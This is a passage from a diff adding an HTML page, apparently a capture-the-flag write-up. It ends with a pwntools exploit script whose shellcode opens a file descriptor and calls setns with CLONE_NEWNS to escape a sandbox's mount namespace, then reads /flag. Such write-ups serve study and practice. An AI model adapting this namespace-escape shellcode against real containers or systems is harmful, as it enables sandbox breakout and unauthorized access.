+</span><span style="color:#a3be8c;">        mov rax, 2
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">        // setns(fd, CLONE_NEWNS)
+</span><span style="color:#a3be8c;">        mov rsi, 0x20000
+</span><span style="color:#a3be8c;">        mov rdi, rax
+</span><span style="color:#a3be8c;">        mov rax, 308
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">    </span><span>&#39;&#39;&#39;)
+</span><span>    r.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(sc + </span><span style="color:#bf616a;">asm</span><span>(shellcraft.</span><span style="color:#bf616a;">cat</span><span>(&quot;</span><span style="color:#a3be8c;">/flag</span><span>&quot;)))
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
